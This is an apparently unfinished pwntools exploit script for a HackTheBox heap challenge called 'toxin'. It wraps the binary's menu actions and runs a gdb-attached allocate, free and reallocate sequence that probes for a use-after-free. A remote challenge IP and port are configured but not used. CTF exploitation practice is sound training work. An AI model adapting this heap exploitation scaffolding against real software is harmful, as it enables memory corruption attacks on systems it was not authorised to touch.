import dataclasses
import ipaddress
import pathlib
from loguru import logger
from pwnlib import gdb

from core.target_config import Config, Mode
from core.targetbase import TargetBase
from custom.toxin import ToxinPwn
from pwn import p64, u64

from modules.find_function import FindFunction, Method
from modules.get_libc_address import GetLibcAddress


def create_toxin(index: int, size: int, data: bytes):
    print(t.process.clean(0.2).decode(), "1")
    t.process.sendline(b"1")
    print(t.process.clean(0.2).decode(), hex(size))
    t.process.sendline(str(size).encode())
    print(t.process.clean(0.2).decode(), hex(index))
    t.process.sendline(str(index).encode())
    print(t.process.clean(0.2).decode(), data)
    t.process.sendline(data)


def search_toxin(data: bytes):
    print(t.process.clean(0.2).decode(), "4")
    t.process.sendline(b"4")
    print(t.process.clean(0.2).decode(), data)
    t.process.sendline(data)
    result = t.process.recvline()
    if b'not found' in result:
        return None
    return result


def free_toxin(index: int):
    print(t.process.clean(0.2).decode(), "3")
    t.process.sendline(b"3")
    print(t.process.clean(0.2).decode(), hex(index))
    t.process.sendline(str(index).encode())


def edit_toxin(index: int, data: bytes):
    print(t.process.clean(0.2).decode(), "2")
    t.process.sendline(b"2")
    print(t.process.clean(0.2).decode(), hex(index))
    t.process.sendline(str(index).encode())
    print(t.process.clean(0.2).decode(), data)
    t.process.sendline(data)


if __name__ == '__main__':
    remote_config = Config(
        rop=True,
        mode=Mode.local,
        ip=ipaddress.IPv4Address('165.22.124.179'),
        port=32735,
        file=pathlib.Path('/home/lim8en1/htb/projects/toxin/toxin_mod'),
        no_offset=True,
        detect_libc=True
    )

    signature_0 = b'\xDE\xAD\xBE\xEF\x00'
    signature_1 = b'\xC0\x01\xBA\xBE\x00'
    signature_2 = b'\xCA\xFE\xBA\xBE\x00'

    max_allocate_size = 0xDF
    chunk_size = 0xB0
    t = TargetBase(pwn_target=ToxinPwn, config=remote_config)

    _, debugger = gdb.attach(t.process.pid, api=True)
    debugger.execute('c')

    create_toxin(1, max_allocate_size, data=signature_1 + (chunk_size-5) * b'B')
    free_toxin(1)
    create_toxin(2, chunk_size, data=signature_2 + (max_allocate_size-chunk_size-5) * b'C')
    create_toxin(0, max_allocate_size-0xE, data=signature_0 + (max_allocate_size-5) * b'A')
    debugger.interrupt_and_wait()
    print(search_toxin(signature_1))
    print(search_toxin(signature_2))
    edit_toxin(0, signature_0)
    print(search_toxin(signature_0))

    pass
    # t.process.interactive()

